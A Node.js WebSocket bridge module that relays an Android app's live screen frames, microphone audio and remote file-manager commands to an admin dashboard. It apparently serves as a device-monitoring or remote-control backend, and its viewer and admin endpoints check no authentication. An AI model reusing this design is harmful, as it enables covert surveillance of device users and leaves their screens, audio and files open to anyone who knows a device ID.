/**
 * Raw-WebSocket compatibility bridge.
 *
 * The Android app streams and receives command wakes over plain WebSocket
 * (OkHttp), exactly as it did against the old FastAPI backend. Rewriting the
 * device to a native Socket.IO client would require an untested libwebsocket
 * migration, so instead we keep the *exact* device-side contract and bridge the
 * traffic into the new Socket.IO `/dashboard` rooms used by the web dashboard.
 *
 * Device-side endpoints (relative to https://host/api/v1):
 *   commands/ws/{deviceId}        — persistent wake channel (server → device)
 *   screen/upload/{deviceId}      — device → server JPEG frames
 *   screen/audio/upload/{deviceId}— device → server: 1 text format msg, then PCM
 *   files/device/{deviceId}       — device ⇄ server JSON (file manager)
 *
 * Legacy admin endpoints (kept so an old dashboard still works alongside the
 * new Socket.IO one):
 *   screen/view/{deviceId}
 *   screen/audio/view/{deviceId}
 *   files/admin/{deviceId}
 *
 * Each device frame is fanned out to:
 *   • any legacy WS viewers, and
 *   • the matching Socket.IO `/dashboard` room (screen:<id> / audio:<id> /
 *     files:<id>) so the React dashboard receives it via socket.io-client.
 */

import { WebSocketServer } from 'ws';
import {
  setExternalWake,
  setExternalDeviceOnline,
  setExternalFileRequest,
  setExternalStreamStatus,
} from './realtime.js';

// deviceId → Set<ws> of open command sockets (Android app).
const commandSockets = new Map();
// deviceId → ws of the active screen / audio / file producer.
const screenProducers = new Map();
const audioProducers = new Map();
const fileProducers = new Map();
// deviceId → Set<ws> legacy viewers.
const screenViewers = new Map();
const audioViewers = new Map();
const fileAdmins = new Map();
// deviceId → last audio format JSON string.
const audioFormat = new Map();

function addTo(map, key, ws) {
  let set = map.get(key);
  if (!set) { set = new Set(); map.set(key, set); }
  set.add(ws);
}
function removeFrom(map, key, ws) {
  const set = map.get(key);
  if (set) { set.delete(ws); if (set.size === 0) map.delete(key); }
}
function broadcast(map, key, data, isBinary) {
  const set = map.get(key);
  if (!set) return;
  for (const ws of set) {
    if (ws.readyState === ws.OPEN) {
      try { ws.send(data, { binary: isBinary }); } catch { /* ignore */ }
    }
  }
}

let ioRef = null;
function dash() { return ioRef ? ioRef.of('/dashboard') : null; }

export function initStreamBridge(httpServer, io) {
  ioRef = io;

  const wss = new WebSocketServer({ noServer: true });

  httpServer.on('upgrade', (req, socket, head) => {
    let pathname;
    try {
      pathname = new URL(req.url, 'http://localhost').pathname;
    } catch {
      socket.destroy();
      return;
    }

    // Let Socket.IO handle its own upgrade path.
    if (pathname.startsWith('/socket.io')) return;

    const route = matchRoute(pathname);
    if (!route) {
      // Not one of our WS endpoints — close politely.
      socket.destroy();
      return;
    }

    wss.handleUpgrade(req, socket, head, (ws) => {
      handleConnection(ws, route);
    });
  });

  // Wire realtime.js hooks so Socket.IO-driven actions reach WS devices.
  setExternalWake((deviceId) => wakeDeviceWs(deviceId));
  setExternalDeviceOnline((deviceId) => isDeviceOnlineWs(deviceId));
  setExternalFileRequest((deviceId, text) => sendFileRequestToDevice(deviceId, text));
  setExternalStreamStatus((deviceId) => ({
    video_streaming: screenProducers.has(deviceId),
    audio_streaming: audioProducers.has(deviceId),
  }));

  console.log('WebSocket bridge initialized (command/screen/audio/files)');
  return wss;
}

const ROUTES = [
  { re: /\/commands\/ws\/([^/]+)\/?$/, type: 'command' },
  { re: /\/screen\/upload\/([^/]+)\/?$/, type: 'screen-upload' },
  { re: /\/screen\/view\/([^/]+)\/?$/, type: 'screen-view' },
  { re: /\/screen\/audio\/upload\/([^/]+)\/?$/, type: 'audio-upload' },
  { re: /\/screen\/audio\/view\/([^/]+)\/?$/, type: 'audio-view' },
  { re: /\/files\/device\/([^/]+)\/?$/, type: 'file-device' },
  { re: /\/files\/admin\/([^/]+)\/?$/, type: 'file-admin' },
];

function matchRoute(pathname) {
  for (const r of ROUTES) {
    const m = pathname.match(r.re);
    if (m) return { type: r.type, deviceId: decodeURIComponent(m[1]) };
  }
  return null;
}

function handleConnection(ws, { type, deviceId }) {
  switch (type) {
    case 'command': return handleCommand(ws, deviceId);
    case 'screen-upload': return handleScreenUpload(ws, deviceId);
    case 'screen-view': return handleScreenView(ws, deviceId);
    case 'audio-upload': return handleAudioUpload(ws, deviceId);
    case 'audio-view': return handleAudioView(ws, deviceId);
    case 'file-device': return handleFileDevice(ws, deviceId);
    case 'file-admin': return handleFileAdmin(ws, deviceId);
    default: ws.close();
  }
}

// ── Command wake channel ────────────────────────────────
function handleCommand(ws, deviceId) {
  addTo(commandSockets, deviceId, ws);
  try { ws.send('{"event":"connected"}'); } catch { /* ignore */ }
  // Heartbeat keepalive.
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });
  ws.on('message', () => { /* acks / pings — ignore */ });
  ws.on('close', () => removeFrom(commandSockets, deviceId, ws));
  ws.on('error', () => removeFrom(commandSockets, deviceId, ws));
}

export function wakeDeviceWs(deviceId) {
  const set = commandSockets.get(deviceId);
  if (!set || set.size === 0) return false;
  let sent = false;
  for (const ws of set) {
    if (ws.readyState === ws.OPEN) {
      try { ws.send('{"event":"command"}'); sent = true; } catch { /* ignore */ }
    }
  }
  return sent;
}

export function isDeviceOnlineWs(deviceId) {
  const set = commandSockets.get(deviceId);
  return !!(set && set.size > 0);
}

// ── Screen ──────────────────────────────────────────────
function handleScreenUpload(ws, deviceId) {
  screenProducers.set(deviceId, ws);
  const d = dash();
  if (d) d.to(`rtc:${deviceId}`).emit('publisher-online', { device_id: deviceId });
  ws.on('message', (data, isBinary) => {
    const buf = isBinary ? data : Buffer.from(data);
    broadcast(screenViewers, deviceId, buf, true);
    if (d) d.to(`screen:${deviceId}`).emit('screen-frame', buf);
  });
  const cleanup = () => {
    if (screenProducers.get(deviceId) === ws) screenProducers.delete(deviceId);
    if (d) d.to(`rtc:${deviceId}`).emit('publisher-offline', { device_id: deviceId });
  };
  ws.on('close', cleanup);
  ws.on('error', cleanup);
}

function handleScreenView(ws, deviceId) {
  addTo(screenViewers, deviceId, ws);
  ws.on('close', () => removeFrom(screenViewers, deviceId, ws));
  ws.on('error', () => removeFrom(screenViewers, deviceId, ws));
}

// ── Audio ───────────────────────────────────────────────
function handleAudioUpload(ws, deviceId) {
  audioProducers.set(deviceId, ws);
  const d = dash();
  ws.on('message', (data, isBinary) => {
    if (!isBinary) {
      // First (and any) text message is the PCM format descriptor.
      const text = Buffer.isBuffer(data) ? data.toString('utf8') : String(data);
      audioFormat.set(deviceId, text);
      broadcast(audioViewers, deviceId, text, false);
      if (d) {
        let meta = text;
        try { meta = JSON.parse(text); } catch { /* keep string */ }
        d.to(`audio:${deviceId}`).emit('audio-format', meta);
      }
      return;
    }
    const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
    broadcast(audioViewers, deviceId, buf, true);
    if (d) d.to(`audio:${deviceId}`).emit('audio-frame', buf);
  });
  const cleanup = () => {
    if (audioProducers.get(deviceId) === ws) audioProducers.delete(deviceId);
    audioFormat.delete(deviceId);
  };
  ws.on('close', cleanup);
  ws.on('error', cleanup);
}

function handleAudioView(ws, deviceId) {
  addTo(audioViewers, deviceId, ws);
  const fmt = audioFormat.get(deviceId);
  if (fmt) { try { ws.send(fmt); } catch { /* ignore */ } }
  ws.on('close', () => removeFrom(audioViewers, deviceId, ws));
  ws.on('error', () => removeFrom(audioViewers, deviceId, ws));
}

// ── File manager ────────────────────────────────────────
function handleFileDevice(ws, deviceId) {
  fileProducers.set(deviceId, ws);
  const d = dash();
  if (d) d.to(`files:${deviceId}`).emit('file-message', '{"event":"device_online"}');
  ws.on('message', (data, isBinary) => {
    const text = isBinary
      ? (Buffer.isBuffer(data) ? data.toString('utf8') : String(data))
      : (Buffer.isBuffer(data) ? data.toString('utf8') : String(data));
    broadcast(fileAdmins, deviceId, text, false);
    if (d) d.to(`files:${deviceId}`).emit('file-message', text);
  });
  const cleanup = () => {
    if (fileProducers.get(deviceId) === ws) fileProducers.delete(deviceId);
    broadcast(fileAdmins, deviceId, '{"event":"device_offline"}', false);
    if (d) d.to(`files:${deviceId}`).emit('file-message', '{"event":"device_offline"}');
  };
  ws.on('close', cleanup);
  ws.on('error', cleanup);
}

function handleFileAdmin(ws, deviceId) {
  addTo(fileAdmins, deviceId, ws);
  const online = fileProducers.has(deviceId);
  try { ws.send(online ? '{"event":"device_online"}' : '{"event":"device_offline"}'); } catch { /* ignore */ }
  // Admin → device requests (listings, downloads, deletes…).
  ws.on('message', (data) => {
    const text = Buffer.isBuffer(data) ? data.toString('utf8') : String(data);
    sendFileRequestToDevice(deviceId, text);
  });
  ws.on('close', () => removeFrom(fileAdmins, deviceId, ws));
  ws.on('error', () => removeFrom(fileAdmins, deviceId, ws));
}

/** Forward a file-manager request from any admin (WS or Socket.IO) to device. */
export function sendFileRequestToDevice(deviceId, text) {
  const ws = fileProducers.get(deviceId);
  if (ws && ws.readyState === ws.OPEN) {
    try { ws.send(text); return true; } catch { /* ignore */ }
  }
  return false;
}

export default { initStreamBridge, wakeDeviceWs, isDeviceOnlineWs, sendFileRequestToDevice };
